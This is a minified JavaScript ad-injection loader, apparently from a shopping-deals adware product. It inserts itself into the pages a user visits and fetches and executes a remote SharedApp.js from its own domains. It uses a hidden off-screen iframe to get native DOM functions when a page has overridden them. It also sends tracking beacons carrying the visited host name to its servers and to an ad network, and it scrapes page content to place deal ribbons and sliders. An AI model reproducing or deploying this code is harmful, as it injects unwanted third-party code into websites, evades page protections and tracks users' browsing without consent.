(function() {
    window.FO_DOMAIN = ".bestpriceninja.com";
    var Injector = function() {
        function e() {}
        return e.getAltDocument = function() {
            if (null == e.altDocument) {
                var t = document.createElement("iframe");
                t.style.border = "0px",
                t.style.width = "1px",
                t.style.height = "1px",
                t.style.left = "-100px",
                t.style.top = "-100px",
                t.style.visibility = "hidden",
                document.body.appendChild(t),
                e.altDocument = t.contentWindow.document
            }
            return e.altDocument
        },
        e.retryOnFailure = function(t, n, r) {
            try {
                t(function(a) {
                    0 == n ? r(a) : e.retryOnFailure(t, n - 1, r)
                },
                n)
            } catch(a) {
                0 == n ? r(a) : e.retryOnFailure(t, n - 1, r)
            }
        },
        e.injectScriptWithRetries = function(t, n, r, a) {
            void 0 === a && (a = !1),
            e.retryOnFailure(function(r, o) {
                return e.injectScript(t + "?retries=" + o, n, r, a)
            },
            3, r)
        },
        e.injectScript = function(t, n, r, a) {
            void 0 === a && (a = !1);
            var o = null,
            i = !0,
            d = !1,
            c = document.createElement;
            c.toString().indexOf("[native code]") > 0 ? o = document.createElement("script") : (o = e.getAltDocument().createElement.call(document, "script"), i = !1),
            o.onload = o.onreadystatechange = function(e) {
                d || o.readyState && "loaded" !== o.readyState && "complete" !== o.readyState || (d = !0, a && console.log("Injected script loaded"), n && window.setTimeout(function() {
                    n()
                },
                1))
            },
            o.onerror = function(e) {
                d || (d = !0, a && console.warn("Injected script failed", e), r && window.setTimeout(function() {
                    r(e)
                },
                1))
            };
            var u = document.getElementsByTagName("head")[0],
            s = u.appendChild;
            return s.toString().indexOf("[native code]") > 0 ? u.appendChild(o) : (e.getAltDocument().appendChild.call(u, o), i = !1),
            o.src = t,
            a && console.log("Injected script " + t + ". Using native functions: " + i),
            i
        },
        e.altDocument = null,
        e
    } (),
    BootstrapHelper = function() {
        function e() {}
        return e.ready = function() {
            if (!e.readyFired) {
                e.readyFired = !0;
                for (var t = 0; t < e.readyList.length; t++) e.readyList[t].fn();
                e.readyList = []
            }
        },
        e.readyStateChange = function() {
            "complete" === document.readyState && e.ready()
        },
        e.documentReady = function(t) {
            return e.readyFired ? void setTimeout(t, 1) : (e.readyList.push({
                fn: t
            }), void("complete" === document.readyState || !document.attachEvent && "interactive" === document.readyState ? setTimeout(e.ready, 1) : e.readyEventHandlersInstalled || (document.addEventListener ? (document.addEventListener("DOMContentLoaded", e.ready, !1), window.addEventListener("load", e.ready, !1)) : (document.attachEvent("onreadystatechange", e.readyStateChange), window.attachEvent("onload", e.ready)), e.readyEventHandlersInstalled = !0)))
        },
        e.bootstrapWhenDocumentReady = function(t, n, r) {
            void 0 === r && (r = []),
            e.documentReady(function() {
                return e.bootstrap(t, n, r)
            })
        },
        e.bootstrap = function(t, n, r) {
            void 0 === r && (r = []);
            var a = !!window.FO_DEBUG;
            r && r.length || (r = window.FO_DOMAIN ? [window.FO_DOMAIN] : [".datafastguru.info"]);
            var o = e.selectDomain(r);
            e.notify(o, t, "inj", {},
            .01),
            e.notifyGenericUrl("https://secure.adnxs.com/seg?add=2735784&t=2");
            var i = "//pstatic" + o + "/nwp/v0_0_1109/release/Shared/App/SharedApp.js",
            d = "FO.Shared_" + n + ".App.SharedApp";
            e.retryOnFailure(function(n) {
                return e.injectAndInstantiate(i, d, o, t, a, n)
            },
            3,
            function(n) {
                return e.notify(o, t, "exception", {
                    ex: "Failure to get SharedApp " + (n && n.message)
                },
                .01)
            })
        },
        e.retryOnFailure = function(t, n, r) {
            t(function(a) {
                0 == n ? r(a) : e.retryOnFailure(t, n - 1, r)
            })
        },
        e.injectAndInstantiate = function(t, n, r, a, o, i) {
            Injector.injectScript(t + "?t=" + e.sharedAppTrialNum++,
            function() {
                try {
                    var t = e.instantiateClass(n);
                    t.init(a, r)
                } catch(d) {
                    o && console.error(d),
                    i(d)
                }
            },
            i, o)
        },
        e.notify = function(t, n, r, a, o) {
            var i = Math.random() < o;
            if (i) {
                var d = "//app" + t + "/a/" + r + "/logo.png",
                c = {};
                c.fam = "nwp",
                c.t = (new Date).getTime() + "",
                c.v = "0_0_1109",
                c.dmn = t,
                c.partid = n.partnerCode,
                c.subid = n.subId,
                c.hn = document.location.host,
                c.safepassage = "1";
                for (var u in a) c[u] = a[u];
                e.notifyGenericUrl(d, c)
            }
        },
        e.notifyGenericUrl = function(e, t) {
            void 0 === t && (t = {});
            try {
                if (t) {
                    e += "?";
                    for (var n in t) {
                        var r = t[n] + "";
                        e = e + "&" + n + "=" + encodeURIComponent(r)
                    }
                }
                return (new Image).src = e,
                !0
            } catch(a) {
                return ! 1
            }
        },
        e.selectDomain = function(e) {
            for (var t = [], n = 0; n < e.length; n++) e[n] && e[n].length && e[n].indexOf("$") == -1 && t.push(e[n]);
            var n = Math.floor(Math.random() * t.length);
            return t[n]
        },
        e.instantiateClass = function(e) {
            for (var t = e.split("."), n = window, r = 0; r < t.length; r++) n = n[t[r]];
            var a = new n;
            return a
        },
        e.sharedAppTrialNum = 0,
        e.readyFired = !1,
        e.readyEventHandlersInstalled = !1,
        e.readyList = [],
        e
    } (),
    params = {
        "products": {
            "RibbonX9": [{
                "logic": ["RibbonImageDealsLogic"],
                "visual": "RibbonX9",
                "weight": 10
            }],
            "rsTRCP": [{
                "logic": ["CommerceDealsLogic", "CouponsLogic", "TravelsLogic"],
                "visual": "RightSliderY",
                "weight": 10
            }]
        },
        partnerCode: "bunny",
        subId: "mm-1623",
        providerName: "LiveShoppers",
        providerLink: "",
        flags: {
            base: {
                "value": [{
                    "name": "NotificationRates",
                    "flag": "",
                    "variants": [{
                        "name": "Default",
                        "flagValue": "",
                        "odds": 1,
                        "values": [{
                            "name": "notifyrate.inj",
                            "val": "0.01"
                        },
                        {
                            "name": "notifyrate.exception",
                            "val": "0.001"
                        },
                        {
                            "name": "notifyrate.init",
                            "val": "0.01"
                        },
                        {
                            "name": "notifyrate.usr",
                            "val": "0.01"
                        },
                        {
                            "name": "notifyrate.noshow",
                            "val": "0.01"
                        },
                        {
                            "name": "notifyrate.wo",
                            "val": "0.1"
                        },
                        {
                            "name": "notifyrate.generic.pb_result",
                            "val": "0"
                        },
                        {
                            "name": "notifyrate.generic.realimpression",
                            "val": "0.1"
                        },
                        {
                            "name": "notifyrate.generic.bindingError",
                            "val": "0.01"
                        },
                        {
                            "name": "notifyrate.generic.uptime",
                            "val": "0.001"
                        },
                        {
                            "name": "notifyrate.generic.pageribbons",
                            "val": "0.01"
                        },
                        {
                            "name": "notifyrate.generic.ribbon_init",
                            "val": "0.001"
                        }]
                    }]
                },
                {
                    "name": "newScrapeWeight",
                    "flag": "itai_scr_14",
                    "variants": [{
                        "name": "old_scrape_values",
                        "flagValue": "set1",
                        "odds": 0.5,
                        "values": [{
                            "name": "deal-scrape-weights-amplify.title",
                            "val": "6"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.otherqs",
                            "val": "1"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.dedicated",
                            "val": "6"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.search",
                            "val": "8"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.ribbon",
                            "val": "4"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.importantqs",
                            "val": "20"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.text",
                            "val": "0"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.h1",
                            "val": "20"
                        },
                        {
                            "name": "dedicated-part-of-scrape",
                            "val": "1"
                        }]
                    },
                    {
                        "name": "ampv1",
                        "flagValue": "set2",
                        "odds": 0,
                        "values": [{
                            "name": "deal-scrape-weights-amplify.title",
                            "val": "-2"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.otherqs",
                            "val": "-1"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.dedicated",
                            "val": "-6"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.search",
                            "val": "10"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.ribbon",
                            "val": "10"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.importantqs",
                            "val": "10"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.text",
                            "val": "-2"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.h1",
                            "val": "-1"
                        },
                        {
                            "name": "dedicated-part-of-scrape",
                            "val": "1"
                        }]
                    },
                    {
                        "name": "ampv2",
                        "flagValue": "set3",
                        "odds": 0,
                        "values": [{
                            "name": "deal-scrape-weights-amplify.title",
                            "val": "-1"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.otherqs",
                            "val": "-1"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.dedicated",
                            "val": "-1"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.search",
                            "val": "20"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.ribbon",
                            "val": "20"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.importantqs",
                            "val": "20"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.text",
                            "val": "-1"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.h1",
                            "val": "-1"
                        },
                        {
                            "name": "dedicated-part-of-scrape",
                            "val": "1"
                        }]
                    },
                    {
                        "name": "ampv3",
                        "flagValue": "set4",
                        "odds": 0,
                        "values": [{
                            "name": "deal-scrape-weights-amplify.title",
                            "val": "-2"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.otherqs",
                            "val": "-1"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.dedicated",
                            "val": "-6"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.search",
                            "val": "10"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.ribbon",
                            "val": "10"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.importantqs",
                            "val": "10"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.text",
                            "val": "-2"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.h1",
                            "val": "-1"
                        },
                        {
                            "name": "dedicated-part-of-scrape",
                            "val": "0"
                        }]
                    },
                    {
                        "name": "OldExperiment1",
                        "flagValue": "e1",
                        "odds": 0,
                        "values": [{
                            "name": "deal-scrape-weights-amplify.title",
                            "val": "10"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.otherqs",
                            "val": "1"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.dedicated",
                            "val": "0"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.search",
                            "val": "15"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.ribbon",
                            "val": "6"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.importantqs",
                            "val": "20"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.text",
                            "val": "1"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.h1",
                            "val": "8"
                        },
                        {
                            "name": "dedicated-part-of-scrape",
                            "val": "0"
                        }]
                    },
                    {
                        "name": "OldExperiment2",
                        "flagValue": "e2",
                        "odds": 0,
                        "values": [{
                            "name": "deal-scrape-weights-amplify.title",
                            "val": "5"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.otherqs",
                            "val": "1"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.dedicated",
                            "val": "0"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.search",
                            "val": "20"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.ribbon",
                            "val": "15"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.importantqs",
                            "val": "8"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.text",
                            "val": "1"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.h1",
                            "val": "14"
                        },
                        {
                            "name": "dedicated-part-of-scrape",
                            "val": "0"
                        }]
                    },
                    {
                        "name": "ampv4",
                        "flagValue": "set5",
                        "odds": 0,
                        "values": [{
                            "name": "deal-scrape-weights-amplify.title",
                            "val": "6"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.otherqs",
                            "val": "0"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.dedicated",
                            "val": "-6"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.search",
                            "val": "8"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.ribbon",
                            "val": "10"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.importantqs",
                            "val": "20"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.text",
                            "val": "-2"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.h1",
                            "val": "-6"
                        },
                        {
                            "name": "dedicated-part-of-scrape",
                            "val": "0"
                        }]
                    },
                    {
                        "name": "ampv5",
                        "flagValue": "set6",
                        "odds": 0,
                        "values": [{
                            "name": "deal-scrape-weights-amplify.title",
                            "val": "0"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.otherqs",
                            "val": "0"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.dedicated",
                            "val": "0"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.search",
                            "val": "10"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.ribbon",
                            "val": "20"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.importantqs",
                            "val": "20"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.text",
                            "val": "0"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.h1",
                            "val": "6"
                        },
                        {
                            "name": "dedicated-part-of-scrape",
                            "val": "0"
                        }]
                    },
                    {
                        "name": "ampv6",
                        "flagValue": "set7",
                        "odds": 0.5,
                        "values": [{
                            "name": "deal-scrape-weights-amplify.title",
                            "val": "6"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.otherqs",
                            "val": "2"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.dedicated",
                            "val": "6"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.search",
                            "val": "8"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.ribbon",
                            "val": "4"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.importantqs",
                            "val": "8"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.text",
                            "val": "0"
                        },
                        {
                            "name": "deal-scrape-weights-amplify.h1",
                            "val": "20"
                        },
                        {
                            "name": "dedicated-part-of-scrape",
                            "val": "1"
                        }]
                    }]
                },
                {
                    "name": "FavoriteMerchants",
                    "flag": "fav_merch",
                    "variants": [{
                        "name": "New set 1811",
                        "flagValue": "",
                        "odds": 0,
                        "values": [{
                            "name": "favoriteMerchantMaxTime",
                            "val": "2592000"
                        },
                        {
                            "name": "topFavoriteMerchants",
                            "val": "3"
                        },
                        {
                            "name": "favoriteMerchantCookieUpdateRate",
                            "val": "0.1"
                        }]
                    }]
                },
                {
                    "name": "ProtectEvents",
                    "flag": "pe2",
                    "variants": [{
                        "name": "Protect",
                        "flagValue": "1",
                        "odds": 1,
                        "values": [{
                            "name": "view.protect-events",
                            "val": "1"
                        }]
                    },
                    {
                        "name": "Dont",
                        "flagValue": "0",
                        "odds": 0,
                        "values": [{
                            "name": "view.protect-events",
                            "val": "0"
                        }]
                    }]
                },
                {
                    "name": "ProtectDom",
                    "flag": "pdom",
                    "variants": [{
                        "name": "Protect",
                        "flagValue": "1",
                        "odds": 1,
                        "values": [{
                            "name": "view.protect-dom",
                            "val": "1"
                        }]
                    },
                    {
                        "name": "Dont",
                        "flagValue": "0",
                        "odds": 0,
                        "values": [{
                            "name": "view.protect-dom",
                            "val": "0"
                        }]
                    }]
                },
                {
                    "name": "Standown",
                    "flag": "standown",
                    "variants": [{
                        "name": "standown",
                        "flagValue": "1",
                        "odds": 0,
                        "values": [{
                            "name": "should.standown",
                            "val": "1"
                        }]
                    },
                    {
                        "name": "DontStandown",
                        "flagValue": "0",
                        "odds": 1,
                        "values": [{
                            "name": "should.standown",
                            "val": "0"
                        }]
                    }]
                },
                {
                    "name": "skin",
                    "flag": "skin1",
                    "variants": [{
                        "name": "Skin",
                        "flagValue": "holiday",
                        "odds": 0,
                        "values": [{
                            "name": "display.skin",
                            "val": "holiday"
                        }]
                    },
                    {
                        "name": "default",
                        "flagValue": "default",
                        "odds": 1,
                        "values": [{
                            "name": "display.skin",
                            "val": "default"
                        }]
                    }]
                },
                {
                    "name": "SlideView",
                    "flag": "sliderview",
                    "variants": [{
                        "name": "Div",
                        "flagValue": "div",
                        "odds": 1,
                        "values": [{
                            "name": "slider.usediv",
                            "val": "1"
                        }]
                    },
                    {
                        "name": "IFrame",
                        "flagValue": "ifr",
                        "odds": 0,
                        "values": [{
                            "name": "slider.usediv",
                            "val": "0"
                        }]
                    }]
                },
                {
                    "name": "discountData",
                    "flag": "discountData",
                    "variants": [{
                        "name": "no",
                        "flagValue": "no",
                        "odds": 1,
                        "values": [{
                            "name": "deals.use-fake-data",
                            "val": "0"
                        }]
                    }]
                },
                {
                    "name": "contentVer",
                    "flag": "contentVer",
                    "variants": [{
                        "name": "opt0",
                        "flagValue": "0",
                        "odds": 0,
                        "values": [{
                            "name": "content.ver",
                            "val": "0"
                        }]
                    },
                    {
                        "name": "opt1",
                        "flagValue": "1",
                        "odds": 0,
                        "values": [{
                            "name": "content.ver",
                            "val": "1"
                        }]
                    },
                    {
                        "name": "opt2",
                        "flagValue": "2",
                        "odds": 1,
                        "values": [{
                            "name": "content.ver",
                            "val": "2"
                        }]
                    }]
                },
                {
                    "name": "contentVerRatio",
                    "flag": "contentVerRatio",
                    "variants": [{
                        "name": "contentVerRatio",
                        "flagValue": "content.verratio",
                        "odds": 1,
                        "values": [{
                            "name": "content.verratio",
                            "val": "1"
                        }]
                    }]
                },
                {
                    "name": "contentProv",
                    "flag": "contentProv",
                    "variants": [{
                        "name": "contentProv",
                        "flagValue": "contentProv",
                        "odds": 1,
                        "values": [{
                            "name": "content.provider",
                            "val": ""
                        }]
                    }]
                },
                {
                    "name": "usepb",
                    "flag": "usepb",
                    "variants": [{
                        "name": "usepb",
                        "flagValue": "1",
                        "odds": 1,
                        "values": [{
                            "name": "scrape.usepb",
                            "val": "0"
                        }]
                    },
                    {
                        "name": "dontusepb",
                        "flagValue": "dontusepb",
                        "odds": 0,
                        "values": [{
                            "name": "scrape.usepb",
                            "val": "1"
                        }]
                    }]
                },
                {
                    "name": "cadRatio",
                    "flag": "cadRatio",
                    "variants": [{
                        "name": "cadratio",
                        "flagValue": "0",
                        "odds": 1,
                        "values": [{
                            "name": "content.cadratio",
                            "val": "0"
                        }]
                    }]
                }]
            },
            specific: {
                "value": [{
                    "name": "cadRatio",
                    "flag": "cadRatio",
                    "variants": [{
                        "name": "cadratio",
                        "flagValue": "0",
                        "odds": 1,
                        "values": [{
                            "name": "content.cadratio",
                            "val": "1"
                        }]
                    }]
                }]
            }
        }
    },
    version = "0_0_1109";
    top === window && BootstrapHelper.bootstrapWhenDocumentReady(params, version);
})()